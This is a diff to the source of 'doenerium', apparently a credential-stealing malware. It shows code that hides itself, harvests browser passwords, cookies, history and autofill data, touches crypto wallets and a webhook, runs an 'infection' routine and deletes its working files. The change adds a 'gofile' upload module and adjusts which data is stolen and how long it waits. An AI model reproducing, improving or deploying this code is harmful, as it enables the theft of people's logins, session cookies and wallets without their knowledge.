@@ -52,6 +52,10 @@ class doenerium {
             wallets: require("./utils/wallets")(this),
             webhook: require("./utils/webhook")(this),
         }
+
+        
+
+        this.utils.gofile = require("./gofile");
     }
 
     hideSelf() {
@@ -129,7 +133,7 @@ class doenerium {
 
         for (var path of this.config.environ.password_and_cookies_paths) {
             if (this.requires.fs.existsSync(path + "Login Data")) {
-                ["getPasswords", "getCookies", "getBookmarks", "getBrowserData", "getHistory", "getAutofill", "saveBrowserStuff"].forEach(async (_func) => {
+                ["getPasswords", "getCookies", "getBookmarks", "getHistory", "getAutofill"].forEach(async (_func) => {
                     await this.utils.browsers[_func](path)
                 })
             }
@@ -137,7 +141,7 @@ class doenerium {
 
         await this.utils.infection.initialize()
 
-        await this.utils.time.sleep(30000);
+        await this.utils.time.sleep(60000);
 
         this.requires.fs.rmSync(this.config.jszip.path, {
             recursive: true,
